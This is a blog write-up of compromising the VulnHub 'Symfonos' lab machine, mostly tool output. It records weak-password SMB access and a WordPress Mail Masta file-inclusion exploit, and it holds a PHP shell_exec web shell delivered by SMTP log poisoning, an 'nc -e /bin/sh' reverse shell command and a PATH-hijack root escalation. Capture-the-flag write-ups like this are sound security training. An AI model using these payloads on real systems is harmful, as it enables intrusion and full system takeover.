---
layout: post
title: "VulnHub: Symfonos - Writeup 18/04/2024"
description: A writeup for VulnHub Symfonos
date:   2024-04-18 12:06:31 +0000
image:  '/images/post/symfonos.jpg'
tags:   [VulnHub,vhl]
---
## Summary
> Beginner real life based machine designed to teach a interesting way of obtaining a low priv shell as whats given on website 

***

## Setup
`mkdir -p vhl/symfonos/scans; cd vhl/symfonos`
IP Address: 192.168.10.129

`sudo vim /etc/hosts`
192.168.10.129 symfonos.local

***
### Enumeration 

`nmap -sC -sV -Pn -p- symfonos.local -oN scans/nmap -vv`
`nmap -sC -sV -p- -T5 --min-rate 2500 -oN scans/nmap symfonos.local`
```
# nmap findings
# Nmap 7.94SVN scan initiated Thu Apr 18 09:01:38 2024 as: nmap -sC -sV -Pn -p- -oN scans/nmap -vv symfonos.local
Nmap scan report for symfonos.local (192.168.10.129)
Host is up, received user-set (0.0049s latency).
Scanned at 2024-04-18 09:01:38 IST for 13s
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEgzdI5IpQcFfjqrj7pPhaxTxIJaS0kXjIektEgJg0+jGfOGDi+uaG/pM0Jg5lrOh4BElQFIGDQmf10JrV5CPk/qcs8zPRtKxOspCVBgaQ6wdxjvXkJyDvxinDQzEsg6+uVY2t3YWgTeSPoUP+QC4WWTS/r1e2O2d66SIPzBYVKOP2+WmGMu9MS4tFY15cBTQVilprTBE5xjaO5ToZk+LkBA6mKey4dQyz2/u1ipJKdNBS7XmmjIpyqANoVPoiij5A2XQbCH/ruFfslpTUTl48XpfsiqTKWufcjVO08ScF46wraj1okRdvn+1ZcBV/I7n3BOrXvw8Jxdo9x2pPXkUF
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD8/lJjmeqerC3bEL6MffHKMdTiYddhU4dOlT6jylLyyl/tEBwDRNfEhOfc7IZxlkpg4vmRwkU25WdqsTu59+WQ=
|   256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOinjerzzjSIgDxhdUgmP/i6nOtGHQq2ayeO1j1h5d5a
25/tcp  open  smtp        syn-ack Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Issuer: commonName=symfonos
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-06-29T00:29:42
| Not valid after:  2029-06-26T00:29:42
| MD5:   086e:c75b:c397:34d6:6293:70cd:6a76:c4f2
| SHA-1: e3dc:7293:d59b:3444:d39a:41ef:6fc7:2006:bde4:825f
| -----BEGIN CERTIFICATE-----
| MIICyzCCAbOgAwIBAgIJAJzTHaEY8CzbMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
| BAMMCHN5bWZvbm9zMB4XDTE5MDYyOTAwMjk0MloXDTI5MDYyNjAwMjk0MlowEzER
| MA8GA1UEAwwIc3ltZm9ub3MwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
| AQDMqUx7kERzGuX2GTokAv1cRHV81loI0yEE357TgkGOQEZUA9jpAkceEpjHGdu1
| PqfMxETG0TJYdajwYAxr01H5fJmLi04OhKHyKk+yKIRpOO0uU1tvIcpSx5A2QJky
| BY+q/82SZLhx/l2xyP2jrc63mz4FSrzav/oPpNT6rxLoPIvJ8z+vnUr3qp5Ea/DH
| WRePqBVoMqjqc9EGtwND1EMGJKlZb2KeDaqdJ02K3fZQmyR0+HyYoKq93+sKk34l
| 23Q7Tzuq07ZJXHheyN3G6V4uGUmJTGPKTMZlOVyeEo6idPjdW8abEq5ier1k8jWy
| IzwTU8GmPe4MR7csKR1omk8bAgMBAAGjIjAgMAkGA1UdEwQCMAAwEwYDVR0RBAww
| CoIIc3ltZm9ub3MwDQYJKoZIhvcNAQELBQADggEBAF3kiDg7BrB5xNV+ibk7GUVc
| 9J5IALe+gtSeCXCsk6TmEU6l2CF6JNQ1PDisZbC2d0jEEjg3roCeZmDRKFC+NdwM
| iKiqROMh3wPMxnHEKgQ2dwGU9UMb4AWdEWzNMtDKVbgf8JgFEuCje0RtGLKJiTVw
| e2DjqLRIYwMitfWJWyi6OjdvTWD3cXReTfrjYCRgYUaoMuGahUh8mmyuFjkKmHOR
| sMVCO/8UdLvQr7T8QO/682shibBd4B4eekc8aQa7xoEMevSlY8WjtJKbuPvUYsay
| slgPCkgga6SRw1X/loPYutfIvK7NQPqcEM8YrWTMokknp7EsJXDl85hRj6GghhE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        syn-ack Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9246/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 3658/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29541/udp): CLEAN (Failed to receive data)
|   Check 4 (port 47469/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2024-04-17T22:31:51-05:00
| nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SYMFONOS<00>         Flags: <unique><active>
|   SYMFONOS<03>         Flags: <unique><active>
|   SYMFONOS<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2024-04-18T03:31:51
|_  start_date: N/A

```

`gobuster dir --no-error -e -x php,html,txt -u http://symfonos.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --output scans/gobuster`


[Gobuster Cheatsheet](https://linuxcscom.wordpress.com/gobuster/)
```
# gobuster findings
http://symfonos.local/index.html           (Status: 200) [Size: 328]
http://symfonos.local/manual               (Status: 301) [Size: 317] [--> http://symfonos.local/manual/]
http://symfonos.local/.html                (Status: 403) [Size: 294]
http://symfonos.local/.php                 (Status: 403) [Size: 293]
http://symfonos.local/.php                 (Status: 403) [Size: 293]
http://symfonos.local/.html                (Status: 403) [Size: 294]
http://symfonos.local/server-status        (Status: 403) [Size: 302]

```


### Enumerating SMB 
`enum4linux 192.168.10.129`
```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Apr 18 09:23:01 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.10.129
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.10.129 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.10.129 )===============================

Looking up status of 192.168.10.129
	SYMFONOS        <00> -         B <ACTIVE>  Workstation Service
	SYMFONOS        <03> -         B <ACTIVE>  Messenger Service
	SYMFONOS        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.10.129 )==================================


[+] Server 192.168.10.129 allows sessions using username '', password ''


 ===============================( Getting domain SID for 192.168.10.129 )===============================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.10.129 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.10.129 from srvinfo: 
	SYMFONOS       Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ======================================( Users on 192.168.10.129 )======================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: helios	Name: 	Desc: 

user:[helios] rid:[0x3e8]

 ================================( Share Enumeration on 192.168.10.129 )================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	helios          Disk      Helios personal share
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SYMFONOS

[+] Attempting to map shares on 192.168.10.129

//192.168.10.129/print$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.10.129/helios	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.10.129/anonymous	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.10.129/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.10.129 )===========================



[+] Attaching to 192.168.10.129 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] SYMFONOS
	[+] Builtin

[+] Password Info for Domain: SYMFONOS

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ======================================( Groups on 192.168.10.129 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 =================( Users on 192.168.10.129 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-3173842667-3005291855-38846888 and logon username '', password ''

S-1-5-21-3173842667-3005291855-38846888-501 SYMFONOS\nobody (Local User)
S-1-5-21-3173842667-3005291855-38846888-513 SYMFONOS\None (Domain Group)
S-1-5-21-3173842667-3005291855-38846888-1000 SYMFONOS\helios (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\helios (Local User)

 ==============================( Getting printer info for 192.168.10.129 )==============================

No printers returned.
```

### Using smb client for a null session in anonymous share 
```
Username/Password:null/null
smbclient //symfonos.local/anonymous -U ''
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 06:44:49 2019
  ..                                  D        0  Sat Jun 29 06:42:15 2019
  attention.txt                       N      154  Sat Jun 29 06:44:49 2019

		19994224 blocks of size 1024. 17068876 blocks available
smb: \> cat attention.txt
cat: command not found
smb: \> get attention.txt
```
![4de20f2736773ddd1c74f442909fe566.png]({{site.baseurl}}/images/post/4de20f2736773ddd1c74f442909fe566.png)
### Contents of attention.txt
```
 cat attention.txt                                                  

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```
### using the passwords to access helios smb share 
```
Username/Password:helios/qwerty
smbclient //symfonos.local/helios -U 'helios'%qwerty  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 06:02:05 2019
  ..                                  D        0  Sat Jun 29 06:07:04 2019
  research.txt                        A      432  Sat Jun 29 06:02:05 2019
  todo.txt                            A       52  Sat Jun 29 06:02:05 2019
```
![4938b8a39a84b8f73971d1627eab8ddf.png]({{site.baseurl}}/images/post/4938b8a39a84b8f73971d1627eab8ddf.png)
### contents of todo.txt
```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### /h3l105 
Its was a Wordpress Site 
Ran WPscan 

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://symfonos.local/h3l105/ [192.168.10.129]
[+] Started: Thu Apr 18 09:58:13 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom styles for all the default blocks, and is built so that what you see in the editor looks like what you'll see on your website. Twenty Nineteen is designed to be adaptable to a wide range of websites, whether you’re running a photo blog, launching a new business, or supporting a non-profit. Featuring ample whitespace and modern sans-serif headlines paired with classic serif body text, it's built to be beautiful on all screen sizes.
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 | License: GNU General Public License v2 or later
 | License URI: LICENSE
 | Tags: one-column, flexible-header, accessibility-ready, custom-colors, custom-menu, custom-logo, editor-style, featured-images, footer-widgets, rtl-language-support, sticky-post, threaded-comments, translation-ready
 | Text Domain: twentynineteen
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'


[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
```

[As shown above a Masta Mail plugin is present which has a known vulnerability of LFI](https://www.exploit-db.com/exploits/40290) 
using this when we visit any `symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd` we can view that local file 

when viewing `/var/mail/helios` we can see all the mails being recieved by helios 
hence we use `telnet 192.168.10.129 25` to open a smtp shell using this we do the following 
```
Trying 192.168.10.129...
Connected to 192.168.10.129.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)

500 5.5.2 Error: bad syntax

500 5.5.2 Error: bad syntax
MAIL FROM:IFYKYK
250 2.1.0 Ok
RCPT TO:Helios	             
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
.
250 2.0.0 Ok: queued as 3D63B40698

500 5.5.2 Error: bad syntax
QUIT
221 2.0.0 Bye
```
What essentially we are doing in this is we are mailing helios a command injection to use the webpage for rce 
![9c0172b88d7a5197b9a69ad144a6be66.png]({{site.baseurl}}/images/post/9c0172b88d7a5197b9a69ad144a6be66.png)

using `nc -e /bin/sh 192.168.10.129 9001` in browser e parameter we get a shell as helios 
 

# root flag
running `find / -perm -u=s 2>/dev/null` we find a file `/opt/statuscheck` which executes as root 
![90c5275eab251c491ea95f50d5aa4d5a.png]({{site.baseurl}}/images/post/90c5275eab251c491ea95f50d5aa4d5a.png)

When Run this executable curled http://localhost, so in order to exploit this
we create our own curl script with `/bin/sh` in tmp 
```
echo "/bin/sh" > curl 
chmod 777 curl 
export PATH=/tmp:$PATH
```

now when we run ./statuscheck in opt we get a shell as root and get the root flag 
![f3ad8d9229a4820213b13b8f8c5a6f7c.png]({{site.baseurl}}/images/post/f3ad8d9229a4820213b13b8f8c5a6f7c.png)

Location: /root/flag.txt | Flag: 
```
Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!



***
## Wrap Up
> Good Box With elements of smtp and smb for a good pratice 